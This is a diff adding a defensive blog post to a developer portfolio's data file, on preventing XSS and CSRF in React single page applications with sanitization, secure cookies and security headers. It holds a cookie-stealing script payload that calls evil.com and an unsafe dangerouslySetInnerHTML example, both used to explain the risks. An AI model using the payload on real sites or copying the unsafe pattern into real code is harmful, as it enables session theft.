@@ -1,5 +1,132 @@
 export const blogs = [
   {
+    "id": "defending-spas-against-xss-and-csrf",
+    "slug": "defending-spas-against-xss-and-csrf",
+    "title": "Defending Modern Single Page Applications Against Cross-Site Scripting (XSS) and CSRF Attacks",
+    "seoTitle": "Securing Modern SPAs: XSS and CSRF Defense Guide",
+    "description": "Learn practical methods to prevent XSS and defend against CSRF in modern React single page applications using secure headers and HTTP-only cookies.",
+    "publishedAt": "2026-11-06",
+    "updatedAt": "2026-11-06",
+    "readTime": "7 min read",
+    "category": "Security & Architecture",
+    "tags": [
+      "Security",
+      "React",
+      "TypeScript",
+      "Web Architecture"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "To prevent XSS in React, avoid using dangerouslySetInnerHTML and sanitize user input. To defend against CSRF, store session tokens in SameSite HTTP-only cookies instead of localStorage.",
+    "relatedProjectId": 1,
+    "faqs": [
+      {
+        "question": "How do you prevent XSS in React applications?",
+        "answer": "React automatically escapes values embedded in JSX, which protects against most XSS out of the box. However, you must avoid dangerouslySetInnerHTML and validate all data rendered from untrusted sources."
+      },
+      {
+        "question": "Are HttpOnly cookies secure against CSRF?",
+        "answer": "HttpOnly cookies prevent JavaScript from reading your tokens, which stops XSS theft. However, they are still sent automatically by the browser on cross-origin requests, so you must combine them with the SameSite attribute set to Strict or Lax."
+      },
+      {
+        "question": "Should I store JWT authentication tokens in localStorage?",
+        "answer": "No. Storing authentication tokens in localStorage makes them instantly readable by any malicious script injected via an XSS vulnerability. Store session tokens in secure HTTP-only cookies instead."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Understanding the Threat Landscape in Single Page Applications"
+      },
+      {
+        "type": "paragraph",
+        "text": "Modern single page applications shift a massive amount of rendering logic to the client browser. While this creates fast user experiences, it also changes how security vulnerabilities manifest. When building complex business software like [Inventory Management / InvMaster OS](/projects/1), protecting user data and session integrity is non-negotiable. Two common attack vectors threaten client-heavy applications: Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF)."
+      },
+      {
+        "type": "paragraph",
+        "text": "XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute arbitrary JavaScript in the victim's browser. CSRF tricks a authenticated user into executing unwanted actions on a web application in which they are currently authenticated."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Mitigating Cross-Site Scripting (XSS) in React"
+      },
+      {
+        "type": "paragraph",
+        "text": "React protects developers by escaping all content rendered inside JSX expressions by default. If a user inputs malicious markup like `<script>fetch('https://evil.com/'+document.cookie)</script>`, React converts those characters into safe strings rather than executing them."
+      },
+      {
+        "type": "paragraph",
+        "text": "The vulnerability usually appears when developers bypass these built-in protections to render rich text or raw HTML strings using unsafe utilities."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Unsafe vs Safe HTML Rendering in React",
+        "code": "// DANGEROUS: Opens up XSS if userContent contains malicious scripts\nexport function UnsafeRender({ userContent }) {\n  return <div dangerouslySetInnerHTML={{ __html: userContent }} />;\n}\n\n// SAFE: Use a dedicated sanitization library like DOMPurify if raw HTML is mandatory\nimport DOMPurify from 'dompurify';\n\nexport function SafeRender({ userContent }) {\n  const cleanHtml = DOMPurify.sanitize(userContent);\n  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Rule of Thumb for Input Handling",
+        "text": "Never trust data originating from client input fields, URL parameters, or third-party APIs. Always sanitize on both the client side before rendering and on the server side before storing in the database."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Preventing CSRF via Secure Cookie Architecture"
+      },
+      {
+        "type": "paragraph",
+        "text": "Many applications store JSON Web Tokens (JWT) inside browser `localStorage`. While convenient, this practice leaves tokens vulnerable to XSS theft. If an attacker injects a script, they can read `localStorage.getItem('token')` and ship your session credentials to an external server."
+      },
+      {
+        "type": "paragraph",
+        "text": "The secure alternative is storing session tokens in cookies configured with strict security flags:"
+      },
+      {
+        "type": "list",
+        "items": [
+          "HttpOnly: Blocks client-side JavaScript from reading the cookie, neutralizing XSS token theft.",
+          "Secure: Ensures the cookie is only transmitted over encrypted HTTPS connections.",
+          "SameSite=Strict (or Lax): Prevents the browser from sending the cookie along with cross-site requests, mitigating CSRF attacks."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Locking Down Security Headers and Content Security Policy (CSP)"
+      },
+      {
+        "type": "paragraph",
+        "text": "Beyond code-level safeguards, your web server must deliver strong HTTP security headers. A robust Content Security Policy (CSP) restricts the domains from which scripts, stylesheets, and images can be loaded."
+      },
+      {
+        "type": "code",
+        "language": "http",
+        "caption": "Recommended Production Security Headers",
+        "code": "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nStrict-Transport-Security: max-age=63072000; includeSubDomains; preload"
+      },
+      {
+        "type": "paragraph",
+        "text": "Implementing these headers stops clickjacking attempts, prevents MIME-type confusion attacks, and enforces HTTPS connections globally."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "As an independent web developer, I build fast, production-ready web applications with security built into the core architecture. [Hire Aafaque Nazir](/services) or [get in touch for a consultation](/contact)."
+      }
+    ]
+  },
+  {
     "id": "auth-2026-session-cookies-vs-localstorage",
     "slug": "auth-2026-session-cookies-vs-localstorage",
     "title": "Full-Stack Authentication in 2026: Why Session Cookies Beat LocalStorage for Security",
